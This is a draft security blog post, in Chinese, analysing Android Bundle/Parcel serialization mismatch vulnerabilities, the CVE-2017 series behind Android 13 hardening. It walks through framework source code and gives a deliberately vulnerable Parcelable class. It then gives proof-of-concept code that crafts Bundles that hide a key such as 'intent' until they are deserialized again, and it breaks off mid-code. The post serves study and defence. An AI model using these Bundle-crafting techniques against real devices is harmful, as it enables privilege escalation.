---
title: Android序列化与反序列化分析
slug: blog/discussion-39/
number: 39
url: https://github.com/jygzyc/notes/discussions/39
date:
  created: 2025-03-18
  updated: 2025-04-05
created: 2025-03-18
updated: 2025-04-05
authors: [yves]
categories: ['安全技术']
draft: true
comments: true
---

<!-- name: android_serialization_and_deserialization_vulnerability_analysis -->

## 前言

Android安全公告在2018年期间公布过一系列系统框架层的高危提权漏洞，如下表所示：

| CVE            | Parcelable对象            | 公布时间 |
| -------------- | ------------------------- | -------- |
| CVE-2017-0806  | GateKeeperResponse        | 2017.10  |
| CVE-2017-13286 | OutputConfiguration       | 2018.04  |
| CVE-2017-13287 | VerifyCredentialResponse  | 2018.04  |
| CVE-2017-13288 | PeriodicAdvertisingReport | 2018.04  |
| CVE-2017-13289 | ParcelableRttResults      | 2018.04  |
| CVE-2017-13311 | SparseMappingTable        | 2018.05  |
| CVE-2017-13315 | DcParamObject             | 2018.05  |

而Google官方在Android 13中增强了序列化与反序列化的安全性，那么就需要了解这一类漏洞的根因，才能进一步了解官方在安全性上的改动。

## 背景

### Parcel



### Bundle

### Android 12 源码解析

以Android-12.0.0_r3的代码为例

Parcel的反序列化核心函数位于 `android.os.BaseBundle`类型的 `readFromParcelInner`中

```java
/**
    * Reads the Parcel contents into this Bundle, typically in order for
    * it to be passed through an IBinder connection.
    * @param parcel The parcel to overwrite this bundle from.
    */
void readFromParcelInner(Parcel parcel) {
    // Keep implementation in sync with readFromParcel() in
    // frameworks/native/libs/binder/PersistableBundle.cpp.
    // 【1】 读取Bundle数据长度
    int length = parcel.readInt();
    readFromParcelInner(parcel, length);
}

private void readFromParcelInner(Parcel parcel, int length) {
    if (length < 0) {
        throw new RuntimeException("Bad length in parcel: " + length);
    } else if (length == 0) {
        // Empty Bundle or end of data.
        mParcelledData = NoImagePreloadHolder.EMPTY_PARCEL;
        mParcelledByNative = false;
        return;
    } else if (length % 4 != 0) {
        throw new IllegalStateException("Bundle length is not aligned by 4: " + length);
    }
    // 【1】 读取magic number，可以是Java Bundle或者Native Bundle
    final int magic = parcel.readInt();
    final boolean isJavaBundle = magic == BUNDLE_MAGIC; //0x4C444E42; // 'B' 'N' 'D' 'L'
    final boolean isNativeBundle = magic == BUNDLE_MAGIC_NATIVE;//0x4C444E44; // 'B' 'N' 'D' 'N'
    if (!isJavaBundle && !isNativeBundle) {
        throw new IllegalStateException("Bad magic number for Bundle: 0x"
                + Integer.toHexString(magic));
    }
    // 【2】 如果Parcel存在读写Helper（没有研究是什么东西），就不进行lazily-unparcel，而是直接开始unparcel操作
    if (parcel.hasReadWriteHelper()) {
        // If the parcel has a read-write helper, then we can't lazily-unparcel it, so just
        // unparcel right away.
        synchronized (this) {
            initializeFromParcelLocked(parcel, /*recycleParcel=*/ false, isNativeBundle);
        }
        return;
    }

    // 【4】 正常情况下，会使用lazily-unparcel模式，也就是不立即进行数据的反序列化，而是等真正需要使用的时候再进行
    // Advance within this Parcel
    int offset = parcel.dataPosition();
    parcel.setDataPosition(MathUtils.addOrThrow(offset, length));

    Parcel p = Parcel.obtain();
    p.setDataPosition(0);
    p.appendFrom(parcel, offset, length);
    p.adoptClassCookies(parcel);
    if (DEBUG) Log.d(TAG, "Retrieving "  + Integer.toHexString(System.identityHashCode(this))
            + ": " + length + " bundle bytes starting at " + offset);
    p.setDataPosition(0);

    mParcelledData = p;
    mParcelledByNative = isNativeBundle;
}
```

这里面由于正常都是使用lazily-unparcel模式，所以在对Bundle内容进行操作的时候才会实际调用 `initializeFromParcelLocked`来执行反序列化，这种方法有助于在多个进程之间连续传递同一个Bundle而不需要访问其中的内容时提高性能。

```java
private void initializeFromParcelLocked(@NonNull Parcel parcelledData, boolean recycleParcel,
        boolean parcelledByNative) {
    if (LOG_DEFUSABLE && sShouldDefuse && (mFlags & FLAG_DEFUSABLE) == 0) {
        Slog.wtf(TAG, "Attempting to unparcel a Bundle while in transit; this may "
                + "clobber all data inside!", new Throwable());
    }

    if (isEmptyParcel(parcelledData)) {
        if (DEBUG) {
            Log.d(TAG, "unparcel "
                    + Integer.toHexString(System.identityHashCode(this)) + ": empty");
        }
        if (mMap == null) {
            mMap = new ArrayMap<>(1);
        } else {
            mMap.erase();
        }
        mParcelledData = null;
        mParcelledByNative = false;
        return;
    }
    // 【1】 读取key-value个数
    final int count = parcelledData.readInt();
    if (DEBUG) {
        Log.d(TAG, "unparcel " + Integer.toHexString(System.identityHashCode(this))
                + ": reading " + count + " maps");
    }
    if (count < 0) {
        return;
    }
    ArrayMap<String, Object> map = mMap;
    if (map == null) {
        map = new ArrayMap<>(count);
    } else {
        map.erase();
        map.ensureCapacity(count);
    }
    try {
        if (parcelledByNative) {
            // If it was parcelled by native code, then the array map keys aren't sorted
            // by their hash codes, so use the safe (slow) one.
            // 【2】 对于Native Bundle，其Key没有按照hashcode进行排序，需要排序后再存入ArrayMap
            parcelledData.readArrayMapSafelyInternal(map, count, mClassLoader);
        } else {
            // If parcelled by Java, we know the contents are sorted properly,
            // so we can use ArrayMap.append().
            // 【3】 而对于Java Bundle则可以直接向ArrayMap中存入数据，我们主要关注这种情况
            parcelledData.readArrayMapInternal(map, count, mClassLoader);
        }
    } catch (BadParcelableException e) {
        if (sShouldDefuse) {
            Log.w(TAG, "Failed to parse Bundle, but defusing quietly", e);
            map.erase();
        } else {
            throw e;
        }
    } finally {
        mMap = map;
        if (recycleParcel) {
            recycleParcel(parcelledData);
        }
        mParcelledData = null;
        mParcelledByNative = false;
    }
    if (DEBUG) {
        Log.d(TAG, "unparcel " + Integer.toHexString(System.identityHashCode(this))
                + " final map: " + mMap);
    }
}
```

这里面有一个值得注意的问题是Bundle中Key排序的问题，我们在初始构造原始Parcel数据的时候，要考虑到Key的hashcode排序问题，否则在反序列化之后Bundle的key会被重新排序，影响我们后续的利用。

```java
/* package */ void readArrayMapInternal(@NonNull ArrayMap outVal, int N,
        @Nullable ClassLoader loader) {
    if (DEBUG_ARRAY_MAP) {
        RuntimeException here =  new RuntimeException("here");
        here.fillInStackTrace();
        Log.d(TAG, "Reading " + N + " ArrayMap entries", here);
    }
    int startPos;
    // 【1】 循环读取key-value
    while (N > 0) {
        if (DEBUG_ARRAY_MAP) startPos = dataPosition();
        //【2】 读取key，根据上文的结论，也可知得到该值为字符串类型数据
        String key = readString();
        // 【3】 读取value
        Object value = readValue(loader);
        if (DEBUG_ARRAY_MAP) Log.d(TAG, "  Read #" + (N-1) + " "
                + (dataPosition()-startPos) + " bytes: key=0x"
                + Integer.toHexString((key != null ? key.hashCode() : 0)) + " " + key);
        // 【4】 追加到 ArrayMap outVal中
        outVal.append(key, value);
        N--;
    }
    // 【5】 检查key hashcode以及是否有重复的key
    outVal.validate();
}
```

`readValue`的实现则会根据不同类型的value而有所不同

```java
/**
    * Read a typed object from a parcel.  The given class loader will be
    * used to load any enclosed Parcelables.  If it is null, the default class
    * loader will be used.
    */
@Nullable
public final Object readValue(@Nullable ClassLoader loader) {
    int type = readInt();

    switch (type) {
    case VAL_NULL:
        return null;

    case VAL_STRING:
        return readString();

    case VAL_INTEGER:
        return readInt();

    case VAL_MAP:
        return readHashMap(loader);

    case VAL_PARCELABLE:
        return readParcelable(loader);

    case VAL_SHORT:
        return (short) readInt();

    case VAL_LONG:
        return readLong();

    case VAL_FLOAT:
        return readFloat();

    case VAL_DOUBLE:
        return readDouble();

    case VAL_BOOLEAN:
        return readInt() == 1;

    case VAL_CHARSEQUENCE:
        return readCharSequence();

    case VAL_LIST:
        return readArrayList(loader);

    case VAL_BOOLEANARRAY:
        return createBooleanArray();

    case VAL_BYTEARRAY:
        return createByteArray();

    case VAL_STRINGARRAY:
        return readStringArray();

    case VAL_CHARSEQUENCEARRAY:
        return readCharSequenceArray();

    case VAL_IBINDER:
        return readStrongBinder();

    case VAL_OBJECTARRAY:
        return readArray(loader);

    case VAL_INTARRAY:
        return createIntArray();

    case VAL_LONGARRAY:
        return createLongArray();

    case VAL_BYTE:
        return readByte();

    case VAL_SERIALIZABLE:
        return readSerializable(loader);

    case VAL_PARCELABLEARRAY:
        return readParcelableArray(loader);

    case VAL_SPARSEARRAY:
        return readSparseArray(loader);

    case VAL_SPARSEBOOLEANARRAY:
        return readSparseBooleanArray();

    case VAL_BUNDLE:
        return readBundle(loader); // loading will be deferred

    case VAL_PERSISTABLEBUNDLE:
        return readPersistableBundle(loader);

    case VAL_SIZE:
        return readSize();

    case VAL_SIZEF:
        return readSizeF();

    case VAL_DOUBLEARRAY:
        return createDoubleArray();

    default:
        int off = dataPosition() - 4;
        throw new RuntimeException(
            "Parcel " + this + ": Unmarshalling unknown type code " + type + " at offset " + off);
    }
}
```

这里的值在Parcel中也是有定义的

```java
public final class Parcel {
     ...
     // Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.
     private static final int VAL_NULL = -1;
     private static final int VAL_STRING = 0;
     private static final int VAL_INTEGER = 1;
     private static final int VAL_MAP = 2; // length-prefixed
     private static final int VAL_BUNDLE = 3;
     private static final int VAL_PARCELABLE = 4; // length-prefixed
     private static final int VAL_SHORT = 5;
     private static final int VAL_LONG = 6;
     private static final int VAL_FLOAT = 7;
     private static final int VAL_DOUBLE = 8;
     private static final int VAL_BOOLEAN = 9;
     private static final int VAL_CHARSEQUENCE = 10;
     private static final int VAL_LIST  = 11; // length-prefixed
     private static final int VAL_SPARSEARRAY = 12; // length-prefixed
     private static final int VAL_BYTEARRAY = 13;
     private static final int VAL_STRINGARRAY = 14;
     private static final int VAL_IBINDER = 15;
     private static final int VAL_PARCELABLEARRAY = 16; // length-prefixed
     private static final int VAL_OBJECTARRAY = 17; // length-prefixed
     private static final int VAL_INTARRAY = 18;
     private static final int VAL_LONGARRAY = 19;
     private static final int VAL_BYTE = 20;
     private static final int VAL_SERIALIZABLE = 21; // length-prefixed
     private static final int VAL_SPARSEBOOLEANARRAY = 22;
     private static final int VAL_BOOLEANARRAY = 23;
     private static final int VAL_CHARSEQUENCEARRAY = 24;
     private static final int VAL_PERSISTABLEBUNDLE = 25;
     private static final int VAL_SIZE = 26;
     private static final int VAL_SIZEF = 27;
     private static final int VAL_DOUBLEARRAY = 28;
     private static final int VAL_CHAR = 29;
     private static final int VAL_SHORTARRAY = 30;
     private static final int VAL_CHARARRAY = 31;
     private static final int VAL_FLOATARRAY = 32;
     ...
 }
```

能看到不同的数据类型有着不同的读取方法，要想利用这里的问题的话，就要做好数据的布局，参考先导案例，利用 `createByteArray`函数能够更方便地构造需要的数据，这里面还要注意一个问题，就是 `readString`读取时可能存在填充数据，关于这一点，最好的方法是进行实际的测试。

```c
// frameworks/native/libs/binder/Parcel.cpp
const char16_t* Parcel::readString16Inplace(size_t* outLen) const
{
    int32_t size = readInt32();
    // watch for potential int overflow from size+1
    if (size >= 0 && size < INT32_MAX) {
        *outLen = size;
        const char16_t* str = (const char16_t*)readInplace((size+1)*sizeof(char16_t));
        if (str != nullptr) {
            if (str[size] == u'\0') {
                return str;
            }
            android_errorWriteLog(0x534e4554, "172655291");
        }
    }
    *outLen = 0;
    return nullptr;
}
```

同时Bundle的WriteToParcel也具有类似的逻辑

```java
// frameworks/base/core/java/android/os/BaseBundle.java
/**
    * Writes the Bundle contents to a Parcel, typically in order for
    * it to be passed through an IBinder connection.
    * @param parcel The parcel to copy this bundle to.
    */
void writeToParcelInner(Parcel parcel, int flags) {
    // 【1】 对应上文，当存在read-write helper时，立即开始unparcel
    // If the parcel has a read-write helper, we can't just copy the blob, so unparcel it first.
    if (parcel.hasReadWriteHelper()) {
        unparcel();
    }
    // Keep implementation in sync with writeToParcel() in
    // frameworks/native/libs/binder/PersistableBundle.cpp.
    final ArrayMap<String, Object> map;
    // 【2】 如果以lazily-unparcel模式读取数据后并没有进行解析，则直接把mParcelledData写入Parcel中即可，无需进行序列化
    synchronized (this) {
        // unparcel() can race with this method and cause the parcel to recycle
        // at the wrong time. So synchronize access the mParcelledData's content.
        if (mParcelledData != null) {
            if (mParcelledData == NoImagePreloadHolder.EMPTY_PARCEL) {
                parcel.writeInt(0);
            } else {
                int length = mParcelledData.dataSize();
                parcel.writeInt(length);
                parcel.writeInt(mParcelledByNative ? BUNDLE_MAGIC_NATIVE : BUNDLE_MAGIC);
                parcel.appendFrom(mParcelledData, 0, length);
            }
            return;
        }
        map = mMap;
    }

    // Special case for empty bundles.
    if (map == null || map.size() <= 0) {
        parcel.writeInt(0);
        return;
    }
    int lengthPos = parcel.dataPosition();
    parcel.writeInt(-1); // placeholder, will hold length
    parcel.writeInt(BUNDLE_MAGIC);

    int startPos = parcel.dataPosition();
    // 【3】 如果是已反序列化过后的Bundle，则mParcelledData中不会有数据，正常执行序列化流程
    parcel.writeArrayMapInternal(map);
    int endPos = parcel.dataPosition();

    // Backpatch length
    parcel.setDataPosition(lengthPos);
    int length = endPos - startPos;
    // 【4】 写入数据总长度
    parcel.writeInt(length);
    parcel.setDataPosition(endPos);
}
```

序列化中使用的 `writeArrayMapInternal`也具有相似的流程

```java
/**
    * Flatten an ArrayMap into the parcel at the current dataPosition(),
    * growing dataCapacity() if needed.  The Map keys must be String objects.
    */
/* package */ void writeArrayMapInternal(@Nullable ArrayMap<String, Object> val) {
    if (val == null) {
        writeInt(-1);
        return;
    }
    // Keep the format of this Parcel in sync with writeToParcelInner() in
    // frameworks/native/libs/binder/PersistableBundle.cpp.
    // 【1】 写入key-value个数
    final int N = val.size();
    writeInt(N);
    if (DEBUG_ARRAY_MAP) {
        RuntimeException here =  new RuntimeException("here");
        here.fillInStackTrace();
        Log.d(TAG, "Writing " + N + " ArrayMap entries", here);
    }
    int startPos;
    // 【2】循环写入key-value
    for (int i=0; i<N; i++) {
        if (DEBUG_ARRAY_MAP) startPos = dataPosition();
        // 【3】 写入key
        writeString(val.keyAt(i));
        // 【4】 写入value
        writeValue(val.valueAt(i));
        if (DEBUG_ARRAY_MAP) Log.d(TAG, "  Write #" + i + " "
                + (dataPosition()-startPos) + " bytes: key=0x"
                + Integer.toHexString(val.keyAt(i) != null ? val.keyAt(i).hashCode() : 0)
                + " " + val.keyAt(i));
    }
}
```

`writeValue`是和 `readValue`互为逆向逻辑

```java
/**
    * Flatten a generic object in to a parcel.  The given Object value may
    * currently be one of the following types:
    *
    * <ul>
    * <li> null
    * <li> String
    * <li> Byte
    * <li> Short
    * <li> Integer
    * <li> Long
    * <li> Float
    * <li> Double
    * <li> Boolean
    * <li> String[]
    * <li> boolean[]
    * <li> byte[]
    * <li> int[]
    * <li> long[]
    * <li> Object[] (supporting objects of the same type defined here).
    * <li> {@link Bundle}
    * <li> Map (as supported by {@link #writeMap}).
    * <li> Any object that implements the {@link Parcelable} protocol.
    * <li> Parcelable[]
    * <li> CharSequence (as supported by {@link TextUtils#writeToParcel}).
    * <li> List (as supported by {@link #writeList}).
    * <li> {@link SparseArray} (as supported by {@link #writeSparseArray(SparseArray)}).
    * <li> {@link IBinder}
    * <li> Any object that implements Serializable (but see
    *      {@link #writeSerializable} for caveats).  Note that all of the
    *      previous types have relatively efficient implementations for
    *      writing to a Parcel; having to rely on the generic serialization
    *      approach is much less efficient and should be avoided whenever
    *      possible.
    * </ul>
    *
    * <p class="caution">{@link Parcelable} objects are written with
    * {@link Parcelable#writeToParcel} using contextual flags of 0.  When
    * serializing objects containing {@link ParcelFileDescriptor}s,
    * this may result in file descriptor leaks when they are returned from
    * Binder calls (where {@link Parcelable#PARCELABLE_WRITE_RETURN_VALUE}
    * should be used).</p>
    */
public final void writeValue(@Nullable Object v) {
    if (v == null) {
        writeInt(VAL_NULL);
    } else if (v instanceof String) {
        writeInt(VAL_STRING);
        writeString((String) v);
    } else if (v instanceof Integer) {
        writeInt(VAL_INTEGER);
        writeInt((Integer) v);
    } else if (v instanceof Map) {
        writeInt(VAL_MAP);
        writeMap((Map) v);
    } else if (v instanceof Bundle) {
        // Must be before Parcelable
        writeInt(VAL_BUNDLE);
        writeBundle((Bundle) v);
    } else if (v instanceof PersistableBundle) {
        writeInt(VAL_PERSISTABLEBUNDLE);
        writePersistableBundle((PersistableBundle) v);
    } else if (v instanceof Parcelable) {
        // IMPOTANT: cases for classes that implement Parcelable must
        // come before the Parcelable case, so that their specific VAL_*
        // types will be written.
        writeInt(VAL_PARCELABLE);
        writeParcelable((Parcelable) v, 0);
    } else if (v instanceof Short) {
        writeInt(VAL_SHORT);
        writeInt(((Short) v).intValue());
    } else if (v instanceof Long) {
        writeInt(VAL_LONG);
        writeLong((Long) v);
    } else if (v instanceof Float) {
        writeInt(VAL_FLOAT);
        writeFloat((Float) v);
    } else if (v instanceof Double) {
        writeInt(VAL_DOUBLE);
        writeDouble((Double) v);
    } else if (v instanceof Boolean) {
        writeInt(VAL_BOOLEAN);
        writeInt((Boolean) v ? 1 : 0);
    } else if (v instanceof CharSequence) {
        // Must be after String
        writeInt(VAL_CHARSEQUENCE);
        writeCharSequence((CharSequence) v);
    } else if (v instanceof List) {
        writeInt(VAL_LIST);
        writeList((List) v);
    } else if (v instanceof SparseArray) {
        writeInt(VAL_SPARSEARRAY);
        writeSparseArray((SparseArray) v);
    } else if (v instanceof boolean[]) {
        writeInt(VAL_BOOLEANARRAY);
        writeBooleanArray((boolean[]) v);
    } else if (v instanceof byte[]) {
        writeInt(VAL_BYTEARRAY);
        writeByteArray((byte[]) v);
    } else if (v instanceof String[]) {
        writeInt(VAL_STRINGARRAY);
        writeStringArray((String[]) v);
    } else if (v instanceof CharSequence[]) {
        // Must be after String[] and before Object[]
        writeInt(VAL_CHARSEQUENCEARRAY);
        writeCharSequenceArray((CharSequence[]) v);
    } else if (v instanceof IBinder) {
        writeInt(VAL_IBINDER);
        writeStrongBinder((IBinder) v);
    } else if (v instanceof Parcelable[]) {
        writeInt(VAL_PARCELABLEARRAY);
        writeParcelableArray((Parcelable[]) v, 0);
    } else if (v instanceof int[]) {
        writeInt(VAL_INTARRAY);
        writeIntArray((int[]) v);
    } else if (v instanceof long[]) {
        writeInt(VAL_LONGARRAY);
        writeLongArray((long[]) v);
    } else if (v instanceof Byte) {
        writeInt(VAL_BYTE);
        writeInt((Byte) v);
    } else if (v instanceof Size) {
        writeInt(VAL_SIZE);
        writeSize((Size) v);
    } else if (v instanceof SizeF) {
        writeInt(VAL_SIZEF);
        writeSizeF((SizeF) v);
    } else if (v instanceof double[]) {
        writeInt(VAL_DOUBLEARRAY);
        writeDoubleArray((double[]) v);
    } else {
        Class<?> clazz = v.getClass();
        if (clazz.isArray() && clazz.getComponentType() == Object.class) {
            // Only pure Object[] are written here, Other arrays of non-primitive types are
            // handled by serialization as this does not record the component type.
            writeInt(VAL_OBJECTARRAY);
            writeArray((Object[]) v);
        } else if (v instanceof Serializable) {
            // Must be last
            writeInt(VAL_SERIALIZABLE);
            writeSerializable((Serializable) v);
        } else {
            throw new RuntimeException("Parcel: unable to marshal value " + v);
        }
    }
}
```

### 先导案例

在开始详细漏洞解析之前，让我们先看看这一类问题是如何产生的。首先，让我们关注一下Android App交互之间的一些特性，所有的Android程序都可以通过Intent对象发送和接收数据，也当然可以和操作系统进行交互；而Bundle对象也可以包含任意数量的键值对，使用Intent进行传递。

传递Intent时，Bundle对象会被转换（序列化）为包裹在Parcel中的字节数组，然后从序列化的Bundle中读取key和value后自动反序列化。在 Bundle 中，键是字符串，值几乎可以是任何东西。例如，它可以是原始类型、字符串或具有原始类型或字符串的容器。它也可以是一个 Parcelable 对象。因此，Bundle 可以包含实现 Parcelable 接口的任何类型的对象。为此，我们需要实现 `writeToParcel()` 和 `createFromParcel()`方法来序列化和反序列化对象。为了说明我们的观点，让我们创建一个简单的序列化 Bundle。我们将编写一段代码，将三个键值对放入 Bundle 中并对其进行序列化：

```kotlin
fun byteArrayOfInts(vararg ints: Int) = ByteArray(ints.size) { pos -> ints[pos].toByte() }
val testByteArray = byteArrayOfInts(0x01, 0x02, 0x03, 0x04, 0x05, 0x06)
val bundle: Bundle = Bundle()
bundle.putString("String", "Hello")
bundle.putInt("Integer", 123)
bundle.putByteArray("ByteArray", testByteArray)
```

将上面这个bundle对象打印并解析可以得到如下字段

```txt
70 00 00 00-42 4E 44 4C-03 00 00 00 （第一个字节为Bunlde的size，第二个字节为Bundle Magic，第三个字节为key-value键值对数量）
06 00 00 00 （第一个Key的长度）
53 00 74 00-72 00 69 00-6E 00 67 00-00 00 00 00 （String）
00 00 00 00 （第一个value的类型，这里表示String）
05 00 00 00 （第一个value的长度）
48 00 65 00-6C 00 6C 00-6F 00 00 00 （Hello） 
07 00 00 00 （第二个Key的长度）
49 00 6E 00-74 00 65 00-67 00 65 00-72 00 00 00 （Integer）
01 00 00 00 （第二个value的类型，这里表示Int）
7B 00 00 00 （123）
09 00 00 00 （第三个Key的长度）
42 00 79 00-74 00 65 00-41 00 72 00-72 00 61 00-79 00 00 00 （ByteArray）
0D 00 00 00 （第三个value的类型，这里表示ByteArray）
06 00 00 00 （第三个value的长度）
01 02 03 04-05 06 00 00 （[1, 2, 3, 4, 5, 6]）
```

根据得到的字节码，我们关注Bundle序列化的特征

- 按顺序写入所有键值对
- 在每个值之前指示值类型（字节数组为13，整数为1，字符串为0，等等）
- 在数据之前指示可变长度数据大小（字符串的长度、数组的字节数）
- 所有值都是4字节对齐的

所有键和值都按顺序写入Bundle中，因此当访问序列化Bundle对象的任何键或值时，后者将完全反序列化，同时初始化所有包含的Parcelable对象。那么，可能会出现什么样的问题呢？

答案是，一些实现Parcelable的系统类可能在`createFromParcel()`和`writeToParcel()`方法中包含错误。在这些类中，`createFromParcel()`中读取的字节数将不同于`writeToParcel()`中写入的字节数。而可序列化的Parcelable对象一般不单独进行序列化传输，通常需要通过Bundle对象携带，若上述问题存在，则Bundle中的对象边界将在重新序列化后发生更改。这为利用序列化漏洞创造了条件。 下面是一个存在漏洞的错误示例：

```java
public class Demo implements Parcelable {
    byte[] data;
    public Demo() {
        this.data = new byte[0];
    }
    protected Demo(Parcel in) {
        int length = in.readInt();
        data = new byte[length];
        if (length > 0) {
            in.readByteArray(data);
        }
    }
    public static final Creator<Demo> CREATOR = new Creator<Demo>() {
        @Override
        public Demo createFromParcel(Parcel in) {
            return new Demo(in);
        }

        @Override
        public Demo[] newArray(int i) {
            return new Demo[i];
        }
    };

    @Override
    public int describeContents() {
        return 0;
    }

    @Override
    public void writeToParcel(Parcel parcel, int i) {
        parcel.writeInt(data.length);
        parcel.writeByteArray(data);
    }
}
```

如果数据数组大小为0，那么在创建对象时，`createFromParcel()`中将读取一个int（4字节），`writeToParcel()`中将写入两个int（8字节）。第一个int将通过显式调用`writeInt`来编写。调用`writeByteArray()`时将写入第二个int，因为Parcel中的数组长度总是写在数组之前（可以参考上文Bundle序列化的例子，在可变数据前需要写入数据长度）

数据数组大小等于0的情况非常罕见。但即使发生这种情况，如果一次只传输一个序列化对象（在我们的示例中是Demo对象），程序也会继续运行。因此，这些错误往往会被忽视。

现在我们将尝试在Bundle中放置一个数组长度为零的Demo对象：

```java
Bundle bundle = new Bundle();
bundle.putParcelable("0", new Demo());
bundle.putInt("Int", 1);
```

![image-20230123120647942](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230123120647942.png)

让我们查看一下序列化数据的结果

![bundle_serialization.drawio](/images/android_serialization_and_deserialization_vulnerability_analysis/bundle_serialization.drawio.png)

现在让我们反序列化这个对象

```java
Parcel newParcel = Parcel.obtain();
newParcel.writeBundle(bundle);
newParcel.setDataPosition(0);
Bundle testBundle = new Bundle(this.getClass().getClassLoader());
testBundle.readFromParcel(newParcel);
testBundle.keySet();
```

![image-20230127104758654](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127104758654.png)

当运行到`testBundle.keySet()`时就会报错，让我们来看一下问题出现的原因

![image-20230127111308809](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127111308809.png)

在上面两张图中，我们看到在反序列化期间，`createFromParcel`方法中读取了一个int，而不是两个int。因此，Bundle中的所有后续值都被错误读取。0x49处的0x0值被读取为下一个key的长度。0x4C处的0x3值作为密钥读取。0x50处的0x006E0049值被读取为值类型。Parcel没有该类型的值，因此`readFromParcel()`报告了异常。

那么我们怎么进一步利用这个问题呢？让我们看看！Parcelable系统类中的上述错误允许创建在第一次和重复反序列化期间可能不同的Bundle。为了证明这一点，我们将修改前面的示例：

```java
Parcel data = Parcel.obtain();
data.writeInt(3); // 3 个键值对
data.writeString("vuln_class");
data.writeInt(4); // value is Parcelable
data.writeString("com.ecool.demo.Demo");
data.writeInt(0); // data.length
data.writeInt(1); // key length -> key value
data.writeInt(6); // key value -> value is long
data.writeInt(0xD); // 值类型为 bytearray -> low(long)
data.writeInt(-1); // 假 byteArray 长度 -> high(long)
int startPos = data.dataPosition();
data.writeString("hidden"); // bytearray data -> hidden key
data.writeInt(0); // value is string
data.writeString("Hi there"); // hidden value
int endPos = data.dataPosition();
int triggerLen = endPos - startPos;
data.setDataPosition(startPos - 4);
data.writeInt(triggerLen); // overwrite dummy value with the real value
data.setDataPosition(endPos);
data.writeString("A padding");
data.writeInt(0); // value is string
data.writeString("to match pair count");
int length = data.dataSize();
Parcel bndl = Parcel.obtain();
bndl.writeInt(length);
bndl.writeInt(0x4C444E42); // bundle magic
bndl.appendFrom(data, 0, length);
bndl.setDataPosition(0);
```

让我们看看执行之后的结果

![image-20230127120319982](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127120319982-1675192475904-1.png)

对构造的数据进行第一次反序列化，能看到bundle中包含了如下的key和value

```java
Bundle bundle = new Bundle(this.getClass().getClassLoader());
bundle.readFromParcel(bndl);
bundle.keySet();
```

![image-20230127122503841](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127122503841.png)

![image-20230127122036889](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127122036889.png)

现在我们对上面得到的bundle再做一次序列化和反序列化，能够看到此时结果不一致

```java
Parcel newParcel = Parcel.obtain();
newParcel.writeBundle(bundle);  // 再次序列化
newParcel.setDataPosition(0);

Bundle testBundle = new Bundle(this.getClass().getClassLoader());
testBundle.readFromParcel(newParcel);
testBundle.keySet();
```

![image-20230127122852734](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127122852734.png)

![image-20230127122913881](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127122913881.png)

现在让我们看看，bundle现在包含Hidden key（字符串值为“Hi there”），这是前一个bundle没有的。让我们看看这个bundle的片段，看看为什么会发生这种情况：

![image-20230127194623148](/images/android_serialization_and_deserialization_vulnerability_analysis/image-20230127194623148.png)

在这里，我们可以看到该类型漏洞的全部要点。我们可以专门创建一个包含易受攻击类的Bundle。更改这个类的边界将允许在这个Bundle中放置任何对象；例如，Intent，它只会在第二次反序列化之后出现在Bundle中。这将可以在攻击过程中隐藏Intent。



## Parcel的优缺点与改进

通过上面的问题，我们也能够意识到Parcel在设计之初是没有充分考虑安全性的，故Google团队在BlackHat Europe 2022上也引入了新的机制，并且已经同步到了Android 13中，这里大致介绍一下核心的内容

### Parcel Mismatch 问题简介

首先介绍了Parcel是用来读写任意类型的标准Java容器（Array，List，ArrayList，Map等）的类，在这其中可以将任意容器序列化和反序列化，但是读写时不一致就会造成Parcel Mismatch 问题。

### “风水”Bundle——自动改变的Bundle

这里以代码为例，`new Bundle()`是一个反序列化的过程，而 `b.writeToParcel()`是一个序列化的过程，而当 `b!=c`的时候，就会出现漏洞

```java
Bundle b = new Bundle();
// Fill b
Bundle c = new Bundle(b.writeToParcel()); // 模拟通过 IPC 发送 b 的过程
```

我们先以如下问题代码为例，复习一下上面提到的利用过程，可见构造函数和writeToParcel是不匹配的

```java
public class Vulnerable implements Parcelable {
    private final long mData;

    protected Vulnerable(Parcel in) {
        mData = in.readInt();
    }

    @Override
    public void writeToParcel(Parcel parcel, int flags) {
        parcel.writeLong(mData);
    }

    ...
}
```

需要利用的跨进程通信流大致如下：

```markdown
- A: Sends Bundle x to B
- A: <x is serialized>
- B: <x is deserialized>
- B: Inpects x (TOC) and sends to C
- B: <x is serialized>
- C: <x is deserialized>
- C: Uses x (TOU)
```

需要完成的挑战：在来自B的Bundle中隐藏对象("intent"=>42)，让其只能在C中出现，环境为Android 12

让我们来布局一下整个PoC，能看到在两边出现了不匹配的情况

![image.png](/images/android_serialization_and_deserialization_vulnerability_analysis/be0f311b-c69e-4036-9f51-e6853eb291b9-1676313304982-1.png)

由于  `writeToParcel` 比 `createFromParcel` 多写入了一个字节，就会导致 $P_B$ 中读取Long的另一半作为下一个key的长度 ，那么造成的结果如下所示

![image.png](/images/android_serialization_and_deserialization_vulnerability_analysis/3be965b2-ebcc-45b0-9652-3869fc153123-1676313327049-4.png)

进而我们就可以得到完整的利用结构

![image.png](/images/android_serialization_and_deserialization_vulnerability_analysis/ba719236-4a67-43ce-9ec5-fcc3e1cb7110-1676313339514-7.png)

代码如下所示

```kotlin
val p = Parcel.obtain()

// header
p.writeInt(-1) // length, back-patch later
p.writeInt(0x4C444E42) // magic
val startPos = p.dataPosition()
p.writeInt(3) // numItem

// A0
p.writeString("A")
p.writeInt(Type.VAL_PARCELABLE)
p.writeString(Vulnerable::class.java.name)
p.writeInt(666) // mData

// A1
p.writeString("\u000d\u0000\u0008") // 0d00 0000 0800 length=3
p.writeInt(Type.VAL_BYTEARRAY)   //000d

p.writeInt(-1) // hidden data length
val hiddenStartPos = p.dataPosition()
p.writeString("intent")
p.writeInt(Type.VAL_INTEGER)
p.writeInt(42)
val hiddenEndPos = p.dataPosition()
val triggerLen = hiddenEndPos - hiddenStartPos
p.setDataPosition(hiddenStartPos - 4)
p.writeInt(triggerLen)
p.setDataPosition(hiddenEndPos)

// A2
p.writeString("BBBBBB")
p.writeInt(Type.VAL_NULL)

// Back-patch length && reset position
val endPos = p.dataPosition()
val length = endPos - startPos
p.setDataPosition(startPos - 8)
